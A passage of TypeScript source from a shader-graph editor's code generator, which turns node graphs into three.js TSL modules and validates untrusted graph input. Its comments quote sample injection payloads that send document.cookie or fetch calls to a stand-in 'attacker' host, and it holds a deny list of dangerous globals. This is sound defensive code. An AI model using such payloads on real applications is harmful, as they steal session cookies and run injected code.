import { parseExpression } from '@babel/parser';
import type { Node } from '@babel/types';
import type { AppNode, AppEdge, NodeDefinition, GeneratedCode, ShaderNodeData, TSLDataType } from '@/types';
import { getNodeValues } from '@/types';
import { NODE_REGISTRY, effectiveInputs } from '@/registry/nodeRegistry';
import { unwrapCollapsedGroupEdges } from '@/utils/edgeUtils';
import { sanitizeIdentifier } from '@/utils/nameUtils';
import { decodeDataNode, columnForHandle } from '@/utils/dataNode';
import { readMicSettings } from '@/utils/micNode';
import { MIC_CHANNELS, micUniformName, micChannelForHandle } from '@/utils/micAnalysis';
import type { MicChannel } from '@/utils/micAnalysis';
import { imageAssetFor } from './imageAssets';
// Shape inference (1-4 channels) — the same authority the edge/preview layer
// uses, so codegen and the UI agree on what counts as a scalar.
import { getNodeOutputShape, shapeOfDataType } from './cpuEvaluator';
import {
  minMax,
  normalize01,
  capToWidth,
  buildPhaseRamp,
  columnStats,
  planNormalize,
  isNormalizeMode,
  MAX_TEXTURE_WIDTH,
} from '@/utils/dataViz';
import {
  getColormap,
  buildColormapLut,
  LUT_SIZE,
  LUT_COORD_SCALE,
  LUT_COORD_OFFSET,
} from '@/utils/colormaps';
import { float32ToBase64, float16ToBase64 } from '@/utils/binaryCodec';
import { hexToRgb01 } from '@/utils/colorUtils';
import { getComponentCount } from './cpuEvaluator';
import { topologicalSort } from './topologicalSort';

/** Format a JS number as a TSL-safe numeric literal (finite or `0`). */
function num(n: number): string {
  return Number.isFinite(n) ? String(n) : '0';
}

/** Inline expression that rebuilds a Float32Array from base64 at module load. */
function f32Decode(b64: string): string {
  return `new Float32Array(Uint8Array.from(atob("${b64}"), (c) => c.charCodeAt(0)).buffer)`;
}

/** Inline expression that rebuilds a Uint16Array (half-float) from base64. */
function f16Decode(b64: string): string {
  return `new Uint16Array(Uint8Array.from(atob("${b64}"), (c) => c.charCodeAt(0)).buffer)`;
}

/**
 * Trace a Stripes/Data-Viz `signal` edge back to its upstream Data column,
 * capped to the texture budget and normalized to [0, 1]. Returns null when the
 * signal isn't a Data column or the column is too short to ramp. Shared by both
 * visualization branches so the WebGPU-filterability recipe lives in one place.
 */
function traceSignalColumn(
  signalEdge: AppEdge | undefined,
  sorted: AppNode[],
): { capped: Float32Array; cnorm: Float32Array } | null {
  if (!signalEdge) return null;
  const src = sorted.find((n) => n.id === signalEdge.source);
  const capped = columnForHandle(src?.data as ShaderNodeData | undefined, signalEdge.sourceHandle);
  if (!capped) return null;
  return { capped, cnorm: normalize01(capped, minMax(capped)) };
}

/** Emit the setup lines for a filterable 1-D HalfFloat value texture (RedFormat
 *  + LinearFilter — the only float format WebGPU filters without a feature
 *  flag). Shared by the Stripes and Data-Viz bakes. */
function bakeHalfFloatTexture(setupLines: string[], name: string, data: Float32Array): void {
  setupLines.push(
    `const ${name} = new globalThis.THREE.DataTexture(${f16Decode(float16ToBase64(data))}, ${data.length}, 1, globalThis.THREE.RedFormat, globalThis.THREE.HalfFloatType);`,
  );
  setupLines.push(`${name}.minFilter = globalThis.THREE.LinearFilter;`);
  setupLines.push(`${name}.magFilter = globalThis.THREE.LinearFilter;`);
  setupLines.push(`${name}.needsUpdate = true;`);
}

/**
 * Variable base names for nodes whose `tslFunction` is empty because
 * graphToCode emits them by hand. Without an entry a node falls through to the
 * empty-string fallback and every instance collides on the same name.
 */
const CUSTOM_EMISSION_BASENAMES: Record<string, string> = {
  stripes: 'stripes',
  dataviz: 'dataviz',
  imageNode: 'image',
  colormap: 'colormap',
  dataRange: 'norm',
  isolines: 'isolines',
};

/** Emit the setup lines for a 256-texel RGBA colormap LUT. Values are baked in
 *  LINEAR light (see buildColormapLut) and the texture carries no colour-space
 *  tag, so the fetch needs no conversion. ClampToEdge is what makes an
 *  out-of-range `t` saturate at the ramp ends instead of wrapping around to the
 *  opposite colour. */
function bakeColormapTexture(setupLines: string[], name: string, lut: Float32Array): void {
  setupLines.push(
    `const ${name} = new globalThis.THREE.DataTexture(${f16Decode(float16ToBase64(lut))}, ${LUT_SIZE}, 1, globalThis.THREE.RGBAFormat, globalThis.THREE.HalfFloatType);`,
  );
  setupLines.push(`${name}.minFilter = globalThis.THREE.LinearFilter;`);
  setupLines.push(`${name}.magFilter = globalThis.THREE.LinearFilter;`);
  setupLines.push(`${name}.wrapS = globalThis.THREE.ClampToEdgeWrapping;`);
  setupLines.push(`${name}.wrapT = globalThis.THREE.ClampToEdgeWrapping;`);
  setupLines.push(`${name}.needsUpdate = true;`);
}

/**
 * Resolve a numeric node parameter: the upstream variable when a wire is
 * attached, otherwise the stored number rendered through `num()`.
 *
 * Deliberately NOT `resolveExposedParam`, which interpolates the stored value
 * with a bare `String()`. Every value here can arrive from a `.fastshader`
 * file, and these are emitted into a module that the XR popup executes at the
 * app's real origin — so the unwired branch must be a number or nothing.
 */
function numericParam(
  node: AppNode,
  key: string,
  fallback: number,
  edges: AppEdge[],
  varNames: Map<string, string>,
  sorted: AppNode[],
): string {
  const edge = edges.find((e) => e.target === node.id && e.targetHandle === key);
  if (edge) {
    const ref = resolveEdgeRef(edge, edges, varNames, sorted);
    if (ref) return ref;
  }
  const raw = Number(getNodeValues(node)[key]);
  return num(Number.isFinite(raw) ? raw : fallback);
}

/** Sampling coordinate in [0, 1]: uv.x (linear) or normalized radius from a
 *  chosen center (radial/concentric). Shared by Stripes and Data Viz. */
function radialCoordExpr(radial: boolean, cx: number, cy: number, radius: number): string {
  return radial
    ? `uv().sub(vec2(${num(cx)}, ${num(cy)})).length().div(${num(radius)}).clamp(0.0, 1.0)`
    : 'uv().x';
}

/** Valid swizzle component handles for split node output. */
export const VALID_SWIZZLE = new Set(['x', 'y', 'z', 'w']);

/**
 * `#rrggbb` → the `0xrrggbb` literal the colour constructors take.
 *
 * Stored hex values arrive from `.fastshader` files and pasted source, i.e.
 * ADVERSARIAL input: this used to be a bare `0x${val.slice(1)}`, so a hex of
 * `#ff0000); somethingElse(` was spliced verbatim into the generated module.
 * Anything that isn't a literal 6-digit hex degrades to black.
 */
export function hexLiteral(value: unknown): string {
  const s = String(value ?? '');
  return /^#[0-9a-fA-F]{6}$/.test(s) ? `0x${s.slice(1)}` : '0x000000';
}

/**
 * Identifiers that must never appear anywhere in an `unknown`-node expression.
 * These are the gateways to code execution / exfiltration / navigation. Used
 * both as callee names and as referenced/member identifiers, so a payload
 * can't reach them via `window.eval`, `globalThis.fetch`, bracket access, etc.
 */
const FORBIDDEN_GLOBALS = new Set([
  'eval', 'Function', 'fetch', 'import', 'require', 'globalThis',
  'window', 'document', 'self', 'top', 'parent', 'frames', 'navigator',
  'location', 'localStorage', 'sessionStorage', 'indexedDB', 'postMessage',
  'XMLHttpRequest', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker',
  'setTimeout', 'setInterval', 'queueMicrotask', 'constructor', '__proto__',
  'prototype', 'alert', 'open',
]);

/**
 * Recursively decide whether an expression AST node is a *pure data/TSL
 * expression* — literals, identifiers, swizzles, arithmetic, and calls to
 * (non-forbidden) functions whose arguments are themselves safe. Anything that
 * can execute attacker code — arrow functions / function expressions (IIFEs),
 * assignments, sequence/comma operators, computed (bracket) member access,
 * `new`, template literals, spreads, await/yield — falls through to the
 * `default` case and is rejected.
 */
function isSafeExprNode(node: Node | null | undefined): boolean {
  if (!node) return false;
  switch (node.type) {
    case 'NumericLiteral':
    case 'StringLiteral':
    case 'BooleanLiteral':
    case 'NullLiteral':
    case 'BigIntLiteral':
    case 'DecimalLiteral':
      return true;
    case 'Identifier':
      return !FORBIDDEN_GLOBALS.has(node.name);
    case 'UnaryExpression':
      // Allow the numeric/logical unaries that show up in real expressions
      // (e.g. `-1.0`, `!flag`); reject `delete`/`typeof`/`void`.
      return (node.operator === '-' || node.operator === '+' || node.operator === '!') &&
        isSafeExprNode(node.argument);
    case 'BinaryExpression':
      return ['+', '-', '*', '/', '%', '**'].includes(node.operator) &&
        node.left.type !== 'PrivateName' &&
        isSafeExprNode(node.left) && isSafeExprNode(node.right);
    case 'ArrayExpression':
      // A `null` element is an array hole; a SpreadElement falls through to
      // isSafeExprNode's default and is rejected.
      return node.elements.every((el) => el == null || isSafeExprNode(el));
    case 'MemberExpression':
      // Only `obj.prop` (static, non-forbidden property) — never `obj[expr]`.
      return !node.computed &&
        node.property.type === 'Identifier' &&
        !FORBIDDEN_GLOBALS.has(node.property.name) &&
        isSafeExprNode(node.object);
    case 'CallExpression': {
      const callee = node.callee;
      if (callee.type === 'Identifier') {
        if (FORBIDDEN_GLOBALS.has(callee.name)) return false;
      } else if (callee.type === 'MemberExpression') {
        // Method-chain callee, e.g. `vec3(...).mul(2)` — validate the chain.
        if (!isSafeExprNode(callee)) return false;
      } else {
        // Super(), import(), an IIFE callee, a tagged template, etc.
        return false;
      }
      return node.arguments.every((a) => isSafeExprNode(a));
    }
    default:
      return false;
  }
}

/**
 * The `unknown`-node round-trip stores the original call-expression substring
 * in `rawExpression`. graphToCode re-emits it verbatim into the generated
 * module, so a hand-edited `.fastshader` file (or anything else that can write
 * the graph payload) could swap that string for something like
 * `foo((()=>{ window.location='http://attacker/'+document.cookie })())` or
 * `foo(fetch('http://attacker'))` and inject arbitrary JS into the executing
 * shader module.
 *
 * codeToGraph's parser only ever stores the slice of a single CallExpression
 * with a bare-identifier callee. We re-parse on emit and require:
 *   1. parses cleanly as a JS expression (not a statement list)
 *   2. is a CallExpression
 *   3. the callee is a plain Identifier (no `something.eval(...)` /
 *      `(()=>{...})()` / bracket-property access at the top level)
 *   4. EVERY node in the subtree — including the arguments — is a pure
 *      data/TSL expression (isSafeExprNode), so the arguments can't smuggle
 *      `fetch`, an arrow-function IIFE, an assignment, etc.
 *
 * Sandboxing the preview iframe means even a successful injection lands in
 * an opaque-origin frame with no localStorage access, but defense in depth
 * is cheap here: keep the inert fallback (`float(0)`) so the shader still
 * compiles and the editor shows the magenta unknown-node tile, instead of
 * mid-flight surprising the user with attacker JS.
 */
/**
 * Verdict cache: codegen re-runs on every graph change (per keystroke while
 * scrubbing), and each pass re-parsed every unknown node's rawExpression with
 * Babel. The verdict is a pure function of the string, so memoize it —
 * size-capped so pathological churn (many distinct adversarial expressions)
 * can't grow it unboundedly.
 */
const unknownExprVerdicts = new Map<string, boolean>();
const UNKNOWN_EXPR_CACHE_MAX = 500;
/** Expressions above this aren't cached — rawExpression is adversarial input,
 *  and 500 pinned multi-hundred-KB strings would be a memory hold. */
const UNKNOWN_EXPR_CACHE_MAX_LEN = 4096;

function isSafeUnknownExpression(expr: string): boolean {
  const cached = unknownExprVerdicts.get(expr);
  if (cached !== undefined) return cached;
  let verdict = false;
  try {
    const ast = parseExpression(expr, { sourceType: 'module', plugins: ['typescript'] });
    verdict =
      ast.type === 'CallExpression' &&
      ast.callee.type === 'Identifier' &&
      // Deep-validate the whole call (callee name + every argument subtree).
      isSafeExprNode(ast);
  } catch {
    verdict = false;
  }
  if (expr.length <= UNKNOWN_EXPR_CACHE_MAX_LEN) {
    // Evict oldest-first (Map preserves insertion order) instead of a
    // wholesale clear, so a hot graph keeps its working set warm.
    if (unknownExprVerdicts.size >= UNKNOWN_EXPR_CACHE_MAX) {
      const oldest = unknownExprVerdicts.keys().next().value;
      if (oldest !== undefined) unknownExprVerdicts.delete(oldest);
    }
    unknownExprVerdicts.set(expr, verdict);
  }
  return verdict;
}

export function graphToCode(
  nodes: AppNode[],
  edges: AppEdge[],
  registry: Map<string, NodeDefinition> = NODE_REGISTRY
): GeneratedCode {
  if (nodes.length === 0) {
    return { code: '// Empty shader — add nodes to begin\n', importStatements: [], varNames: new Map() };
  }

  // Collapsed groups have rewritten boundary edges to point at synthetic group
  // sockets — translate them back to their original child endpoints so this
  // function compiles against the logical graph rather than the visual one.
  edges = unwrapCollapsedGroupEdges(nodes, edges);

  const sorted = topologicalSort(nodes, edges);

  // Assign unique variable names
  const varNames = new Map<string, string>();
  const usedNames = new Set<string>();

  /**
   * Claim the first free variable name for `base`: `base1`, `base2`, … —
   * or, with `bareFirst`, the bare `base` before falling back to `base2`,
   * `base3`, …. `extraFree` AND-composes with the built-in usedNames check;
   * `aliases` lists companion identifiers a candidate would also emit (e.g. a
   * data node's `<name>_colN` columns) — a candidate is only claimable when
   * every alias passes the same composed check, and claiming reserves the name
   * AND all its aliases.
   */
  const claimName = (
    base: string,
    opts: {
      bareFirst?: boolean;
      extraFree?: (candidate: string) => boolean;
      aliases?: (name: string) => string[];
    } = {}
  ): string => {
    const free = (c: string) => !usedNames.has(c) && (opts.extraFree?.(c) ?? true);
    const claimable = (c: string) => free(c) && (opts.aliases?.(c) ?? []).every(free);
    let idx = 1;
    let name = opts.bareFirst ? base : `${base}${idx}`;
    while (!claimable(name)) name = `${base}${++idx}`;
    usedNames.add(name);
    for (const alias of opts.aliases?.(name) ?? []) usedNames.add(alias);
    return name;
  };

  // Property nodes claim their user-defined names FIRST, before any other node
  // gets a variable. A property's name is its public API — the schema key, the
  // <a-entity> attribute, the setAttribute() key — while every other var name
  // is private to the module body. Claiming in plain topological order let an
  // ordinary node steal a property's name (a Color swatch emitted first claims
  // `color1`, bumping a property NAMED color1 to `color12`), and the exported
  // schema/usage header then documented a key the body never read.
  for (const node of sorted) {
    if (node.data.registryType !== 'property_float' && node.data.registryType !== 'property_color') continue;
    const nodeValues = getNodeValues(node);
    const rawName = String(nodeValues.name ?? 'property1');
    varNames.set(node.id, claimName(sanitizeIdentifier(rawName), { bareFirst: true }));
  }

  for (const node of sorted) {
    const def = registry.get(node.data.registryType);
    if (!def || node.data.registryType === 'output' || node.data.registryType === 'split') continue;

    // Property nodes: already claimed in the pre-pass above.
    if (node.data.registryType === 'property_float' || node.data.registryType === 'property_color') {
      continue;
    }

    // Unknown nodes: use the stored function name as the variable base
    if (def.type === 'unknown') {
      const nv = getNodeValues(node);
      let baseName = String(nv.functionName ?? 'unknown').replace(/[^a-zA-Z0-9_$]/g, '_');
      if (!baseName) baseName = 'unknown';
      varNames.set(node.id, claimName(baseName));
      continue;
    }

    // Data nodes emit one variable PLUS a `<var>_colN` per consumed column, and
    // those column identifiers share the Fn-body namespace with property/unknown
    // names. Claim the column handles this node will emit (the ones an edge
    // references) as aliases so the base only lands where its whole column
    // namespace is free — otherwise a property renamed `data1_col1` collides
    // with the emitted `const data1_col1` → duplicate declaration → SyntaxError.
    if (def.type === 'dataNode') {
      const refCols = new Set<string>();
      for (const e of edges) {
        if (e.source !== node.id) continue;
        if (/^col\d+$/.test(e.sourceHandle ?? '')) refCols.add(e.sourceHandle as string);
      }
      varNames.set(node.id, claimName('data', {
        aliases: (name) => [...refCols].map((h) => `${name}_${h}`),
      }));
      continue;
    }

    // Mic nodes have the same aliasing problem as data nodes: the node emits
    // `<var>_<channel>` identifiers, not `<var>`, so claiming only the base
    // leaves `mic1_bass` free for a user property to take — and the emitted
    // `const mic1_bass = uniform(0);` then collides with the property's own
    // `const mic1_bass = uniform(...)`. Duplicate declaration = SyntaxError =
    // the whole module fails to load, not just this node.
    if (def.type === 'micNode') {
      const refChannels = new Set<MicChannel>();
      for (const e of edges) {
        if (e.source === node.id) refChannels.add(micChannelForHandle(e.sourceHandle));
      }
      varNames.set(node.id, claimName('mic', {
        // Both the uniform AND its gained twin (`_mic1_bass`) share the Fn-body
        // namespace, so both must be reserved or a user property could take one.
        aliases: (name) =>
          [...refChannels].flatMap((ch) => {
            const u = micUniformName(name, ch);
            return [u, `_${u}`];
          }),
      }));
      continue;
    }

    // Nodes with no tslFunction (custom emission) need an explicit base name
    // instead of the empty-string fallback below.
    if (CUSTOM_EMISSION_BASENAMES[def.type]) {
      varNames.set(node.id, claimName(CUSTOM_EMISSION_BASENAMES[def.type]));
      continue;
    }

    let baseName = def.tslFunction;
    // Clean up names for MaterialX functions
    if (baseName.startsWith('mx_')) {
      baseName = baseName.replace('mx_', '').replace(/_float$|_vec[234]$/, '');
    }

    // Always number from 1 to avoid shadowing TSL imports (color1, add1, etc.)
    varNames.set(node.id, claimName(baseName));
  }

  // Collect imports grouped by module
  const importsByModule = new Map<string, Set<string>>();

  const addImport = (module: string, name: string) => {
    if (!module) return;
    if (!importsByModule.has(module)) {
      importsByModule.set(module, new Set());
    }
    importsByModule.get(module)!.add(name);
  };

  // Always need Fn
  addImport('three/tsl', 'Fn');

  for (const node of sorted) {
    const def = registry.get(node.data.registryType);
    if (!def || node.data.registryType === 'output' || !def.tslImportModule) continue;
    // UV import is handled in body generation (with channel parameter)
    if (def.type === 'uv') continue;
    // hsl/toHsl are local helpers, not TSL exports — never try to import them.
    if (def.type === 'hsl' || def.type === 'toHsl') continue;
    addImport(def.tslImportModule, def.tslFunction);
  }

  // Collect helper imports for hsl/toHsl if used
  const usedHsl = sorted.some((n) => n.data.registryType === 'hsl');
  const usedToHsl = sorted.some((n) => n.data.registryType === 'toHsl');
  if (usedHsl) {
    for (const name of ['mul', 'add', 'sub', 'abs', 'mod', 'clamp', 'float', 'vec3']) {
      addImport('three/tsl', name);
    }
  }
  if (usedToHsl) {
    for (const name of ['max', 'min', 'sub', 'add', 'mul', 'abs', 'select', 'greaterThan', 'lessThan', 'equal', 'div', 'float', 'vec3']) {
      addImport('three/tsl', name);
    }
  }

  /**
   * Channel count of the specific OUTPUT PORT an edge leaves from.
   *
   * Node-level inference is not enough: a multi-output node reports the shape
   * of `outputs[0]`, so Data Viz (out: vec3, value: float) claimed 3 channels
   * even for an edge leaving its scalar `value` socket — and the Output-channel
   * widening was skipped, putting a bare float in colorNode again by a second
   * route. The declared port type wins; node-level inference is the fallback
   * for `any`-typed ports (arithmetic chains).
   *
   * Defined HERE, above the emission loop, because the dataviz-family branches
   * need it too: nothing validates connection types, so a vec3 can land on a
   * scalar `value` input and would otherwise reach `vec2(<vec3>, 0.5)`, which is
   * a compile error rather than a wrong picture.
   */
  const shapeOfEdgeSource = (edge: AppEdge): number => {
    const srcNode = sorted.find((n) => n.id === edge.source);
    const handle = edge.sourceHandle ?? 'out';
    const dyn = (srcNode?.data as { dynamicOutputs?: { id: string; dataType: TSLDataType }[] })
      ?.dynamicOutputs;
    const srcDef = srcNode ? registry.get(srcNode.data.registryType) : undefined;
    const port = dyn?.find((o) => o.id === handle) ?? srcDef?.outputs.find((o) => o.id === handle);
    const declared = port ? shapeOfDataType(port.dataType) : 0;
    if (declared > 0) return declared;
    return getNodeOutputShape(edge.source, nodes, edges);
  };

  /**
   * The scalar an edge carries: the plain reference when the source is
   * 1-channel, its `.x` otherwise. Used by the dataviz-family nodes, whose
   * inputs are all scalars.
   */
  const scalarRefOf = (edge: AppEdge | undefined): string | null => {
    if (!edge) return null;
    const ref = resolveEdgeRef(edge, edges, varNames, sorted);
    if (!ref) return null;
    return shapeOfEdgeSource(edge) === 1 ? ref : `${ref}.x`;
  };

  // Build body lines
  const bodyLines: string[] = [];
  // Module-scope setup emitted BEFORE the shader Fn — the Data/Stripes nodes
  // build their `THREE.DataTexture` lookups here (closed over by the Fn body).
  const setupLines: string[] = [];

  for (const node of sorted) {
    const def = registry.get(node.data.registryType);
    if (!def || node.data.registryType === 'output' || node.data.registryType === 'split') continue;

    const varName = varNames.get(node.id)!;

    // Unknown nodes: emit the preserved raw expression verbatim, but only
    // after verifying it still looks like the simple `funcName(args)` shape
    // codeToGraph produces. See isSafeUnknownExpression for the threat
    // model — adversarial graph payloads otherwise get to inject arbitrary
    // statements into the generated module.
    if (def.type === 'unknown') {
      const nv = getNodeValues(node);
      const rawExpr = String(nv.rawExpression ?? 'float(0)');
      const safeExpr = isSafeUnknownExpression(rawExpr) ? rawExpr : 'float(0)';
      bodyLines.push(`  const ${varName} = ${safeExpr};`);
      continue;
    }

    const args = resolveArguments(node, edges, varNames, def, sorted);

    if (def.type === 'uv') {
      // UV node: channel selector + tiling + rotation
      const nv = getNodeValues(node);
      addImport('three/tsl', 'uv');

      // Resolve channel (UV map index)
      const channelExpr = resolveExposedParam(node, 'channel', edges, varNames, nv, sorted);
      const baseExpr = channelExpr === '0' ? 'uv()' : `uv(${channelExpr})`;

      // Resolve tiling and rotation (may be connected via input ports)
      const tilingU = resolveExposedParam(node, 'tilingU', edges, varNames, nv, sorted);
      const tilingV = resolveExposedParam(node, 'tilingV', edges, varNames, nv, sorted);
      const rotationExpr = resolveExposedParam(node, 'rotation', edges, varNames, nv, sorted);
      const hasTiling = tilingU !== '1' || tilingV !== '1';
      const hasRotation = rotationExpr !== '0';

      if (!hasTiling && !hasRotation) {
        bodyLines.push(`  const ${varName} = ${baseExpr};`);
      } else if (hasTiling && !hasRotation) {
        addImport('three/tsl', 'mul');
        addImport('three/tsl', 'vec2');
        bodyLines.push(`  const ${varName} = mul(${baseExpr}, vec2(${tilingU}, ${tilingV}));`);
      } else {
        // Rotation (with optional tiling)
        addImport('three/tsl', 'vec2');
        addImport('three/tsl', 'sub');
        addImport('three/tsl', 'add');
        addImport('three/tsl', 'mul');
        addImport('three/tsl', 'cos');
        addImport('three/tsl', 'sin');
        const scaledExpr = hasTiling ? `mul(${baseExpr}, vec2(${tilingU}, ${tilingV}))` : baseExpr;
        const cVar = `_${varName}`;
        bodyLines.push(`  const ${cVar} = sub(${scaledExpr}, vec2(0.5, 0.5));`);
        bodyLines.push(`  const ${varName} = add(vec2(sub(mul(${cVar}.x, cos(${rotationExpr})), mul(${cVar}.y, sin(${rotationExpr}))), add(mul(${cVar}.x, sin(${rotationExpr})), mul(${cVar}.y, cos(${rotationExpr})))), vec2(0.5, 0.5));`);
      }
    } else if (def.type === 'dataNode') {
      // Data node: one float DataTexture per *consumed* column (FloatType +
      // Nearest = exact values, valid in WebGPU without the float32-filterable
      // feature). Each column output samples its texture at uv.x. The node
      // itself produces no value — resolveEdgeRef maps `colN` handles to the
      // per-column vars emitted here.
      const nv = getNodeValues(node);
      const decoded = decodeDataNode(nv);
      const usedCols = new Set<number>();
      for (const e of edges) {
        if (e.source !== node.id) continue;
        const m = /^col(\d+)$/.exec(e.sourceHandle ?? '');
        if (m) usedCols.add(Number(m[1]));
      }
      if (usedCols.size > 0) {
        // Every referenced column MUST get a declaration: resolveEdgeRef hands
        // consumers `<var>_colN` unconditionally, so a missing one is a runtime
        // ReferenceError that kills the whole module. Columns that decode bake a
        // texture; a missing/undecodable/out-of-range column degrades to an
        // inert float(0) (mirrors the imageNode fallback), so a tampered or
        // truncated payload never crashes the shader.
        addImport('three/tsl', 'float');
        let bakedAny = false;
        for (const ci of [...usedCols].sort((a, b) => a - b)) {
          const col = decoded?.columns[ci];
          if (col && col.length > 0) {
            if (!bakedAny) {
              addImport('three/tsl', 'texture');
              addImport('three/tsl', 'uv');
              addImport('three/tsl', 'vec2');
              bakedAny = true;
            }
            const capped = capToWidth(col, MAX_TEXTURE_WIDTH);
            const texVar = `_${varName}_tex${ci}`;
            setupLines.push(
              `const ${texVar} = new globalThis.THREE.DataTexture(${f32Decode(float32ToBase64(capped))}, ${capped.length}, 1, globalThis.THREE.RedFormat, globalThis.THREE.FloatType);`,
            );
            setupLines.push(`${texVar}.needsUpdate = true;`);
            bodyLines.push(`  const ${varName}_col${ci} = texture(${texVar}, vec2(uv().x, 0.5)).x;`);
          } else {
            bodyLines.push(`  const ${varName}_col${ci} = float(0.0);`);
          }
        }
      }
    } else if (def.type === 'imageNode') {
      // Image node: the dropped image rides inside the module as a compressed
      // data: URL, decoded at module scope with top-level await (the
      // shaderloader `await import()`s the blob module, so the texture is
      // ready before first render; a garbage payload fails decode() and falls
      // back to a 1×1 black texture instead of rejecting the whole module).
      //
      // What lands HERE is a short `fs-asset:` PLACEHOLDER, not the payload —
      // `inlineImageAssets` (engine/imageAssets.ts) expands it at the surfaces
      // that actually run or export the module (preview iframe, XR popup,
      // Output tab, Download Shader). The editor's TSL tab shows this generated
      // text verbatim, and a word-wrapped 600K-char data: URL buries the shader
      // under thousands of rows. Nothing is lost: image nodes are already
      // one-way through codeToGraph, so the payload here was never read back.
      //
      // SECURITY: the stored payload is NEVER interpolated verbatim — the
      // graph JSON is adversarial. imageAssetFor strict-validates it via
      // decodeImageNode and re-encodes the emitted `data:` literal from the
      // decoded bytes (canonical btoa alphabet, MIME from the regex whitelist
      // capture); the placeholder and its trailing comment are built from a
      // character whitelist. So no attacker-controlled character reaches this
      // module's source text on either path. Emitted as FLAT statements (never
      // an async IIFE — codeToGraph's ReturnStatement visitor would mistake its
      // `return` for the shader output).
      const nv = getNodeValues(node);
      const asset = imageAssetFor(node.id, nv);
      if (!asset) {
        // Inert fallback — consumers still reference this var, so it must
        // exist (a missing declaration would be a runtime ReferenceError).
        addImport('three/tsl', 'vec3');
        bodyLines.push(`  const ${varName} = vec3(0, 0, 0);`);
      } else {
        addImport('three/tsl', 'texture');
        const uvEdge = edges.find((e) => e.target === node.id && e.targetHandle === 'uv');
        const uvRef = uvEdge ? resolveEdgeRef(uvEdge, edges, varNames, sorted) : null;
        if (!uvRef) addImport('three/tsl', 'uv');
        // UV-space transform settings (NodeSettingsMenu). All Number-coerced —
        // never interpolate stored strings. The raw sample renders mirrored
        // left-right in the preview pipeline, so the CORRECTED orientation
        // (u' = 1-u) is the baked-in default; the user-facing "Flip X" toggle
        // (default off/unchecked) mirrors RELATIVE to that corrected look —
        // checking it cancels the correction and yields the raw sample. Each
        // flip is `1-c`, emitted as mul/add so it composes with a connected
        // uv source.
        const numVal = (key: string, dflt: number) => {
          const v = Number(nv[key]);
          return Number.isFinite(v) ? v : dflt;
        };
        // Tile/offset can be exposed as sockets — a wired edge overrides the
        // stored value (same contract as the uv node's params). Refs are
        // generated identifiers, literals go through num(): nothing
        // attacker-controlled reaches the emitted text.
        const paramExpr = (key: string, dflt: number): string => {
          const pEdge = edges.find((e) => e.target === node.id && e.targetHandle === key);
          if (pEdge) {
            const ref = resolveEdgeRef(pEdge, edges, varNames, sorted);
            if (ref) return ref;
          }
          return num(numVal(key, dflt));
        };
        const mirrorX = numVal('flipX', 0) < 0.5;
        const mirrorY = numVal('flipY', 0) >= 0.5;
        const tileX = paramExpr('tileX', 1);
        const tileY = paramExpr('tileY', 1);
        const offsetX = paramExpr('offsetX', 0);
        const offsetY = paramExpr('offsetY', 0);
        const repeat = numVal('repeat', 1) >= 0.5;
        let uvExpr = uvRef ?? 'uv()';
        if (mirrorX || mirrorY) {
          uvExpr = `${uvExpr}.mul(vec2(${mirrorX ? -1 : 1}, ${mirrorY ? -1 : 1})).add(vec2(${mirrorX ? 1 : 0}, ${mirrorY ? 1 : 0}))`;
        }
        if (tileX !== '1' || tileY !== '1') uvExpr = `${uvExpr}.mul(vec2(${tileX}, ${tileY}))`;
        if (offsetX !== '0' || offsetY !== '0') uvExpr = `${uvExpr}.add(vec2(${offsetX}, ${offsetY}))`;
        if (uvExpr !== (uvRef ?? 'uv()')) addImport('three/tsl', 'vec2');
        const isData = String(nv.colorSpace ?? 'color') === 'data';
        const imgVar = `_${varName}_img`;
        const okVar = `_${varName}_ok`;
        const texVar = `_${varName}_tex`;
        setupLines.push(`const ${imgVar} = new Image();`);
        setupLines.push(`${imgVar}.src = "${asset.placeholder}"; ${asset.comment}`);
        setupLines.push(`let ${okVar} = true;`);
        setupLines.push(`try { await ${imgVar}.decode(); } catch { ${okVar} = false; }`);
        setupLines.push(
          `const ${texVar} = ${okVar} ? new globalThis.THREE.Texture(${imgVar}) : new globalThis.THREE.DataTexture(new Uint8Array([0, 0, 0, 255]), 1, 1, globalThis.THREE.RGBAFormat, globalThis.THREE.UnsignedByteType);`,
        );
        setupLines.push(`${texVar}.colorSpace = globalThis.THREE.${isData ? 'NoColorSpace' : 'SRGBColorSpace'};`);
        if (isData) {
          // Data maps (normal/height): linear values, no mip pre-filtering.
          setupLines.push(`${texVar}.generateMipmaps = false;`);
          setupLines.push(`${texVar}.minFilter = globalThis.THREE.LinearFilter;`);
          setupLines.push(`${texVar}.magFilter = globalThis.THREE.LinearFilter;`);
        }
        // Repeat (default) so tiling — via the settings above or the uv node's
        // tilingU/tilingV — wraps instead of smearing the edge pixels; the
        // settings menu can switch to clamp. flipY pinned explicitly so
        // orientation never rides on a three.js default.
        const wrapMode = repeat ? 'RepeatWrapping' : 'ClampToEdgeWrapping';
        setupLines.push(`${texVar}.wrapS = globalThis.THREE.${wrapMode};`);
        setupLines.push(`${texVar}.wrapT = globalThis.THREE.${wrapMode};`);
        setupLines.push(`${texVar}.flipY = true;`);
        setupLines.push(`${texVar}.needsUpdate = true;`);
        bodyLines.push(`  const ${varName} = texture(${texVar}, ${uvExpr}).rgb;`);
      }
    } else if (def.type === 'stripes') {
      // Data Stripes: density-modulated bars + sequential color ramp. Stripe
      // density comes from a CPU-precomputed cumulative-phase ramp (prefix-sum
      // of the desired local frequency) baked from the upstream Data column —
      // so the bars stay continuous (no tearing). Derivative AA + moiré
      // fade-to-average defeat shimmering when the period drops below a pixel.
      const nv = getNodeValues(node);
      const bf = Number(nv.baseFrequency ?? 80);
      const dens = Number(nv.density ?? 1.5);
      // Ramp endpoints go out as `color(0x…)`, NOT `vec3(r/255, …)`.
      // THREE.Color converts a hex from sRGB into the renderer's linear working
      // space (ColorManagement, on by default since r152); a bare vec3 of
      // hex/255 does not, so the same swatch rendered lighter here than on a
      // Color node, and the two endpoints were interpolated in the wrong space.
      const lo = hexLiteral(nv.lowColor ?? '#1b2a4a');
      const hi = hexLiteral(nv.highColor ?? '#ffd24d');
      // Radial ("target"/tree-ring) mode: index the data by distance from a
      // choosable center instead of uv.x, so the bands become concentric rings.
      const radial = Number(nv.radial ?? 0) >= 0.5;
      const cx = Number(nv.center_x ?? 0.5);
      const cy = Number(nv.center_y ?? 0.5);
      const radius = Math.max(Number(nv.radius ?? 0.5), 1e-4);
      // How strongly the stripes darken the value-color. 0 = a clean value
      // heatmap (no stripes, colour alone shows the data); ~0.75 = bold stripes.
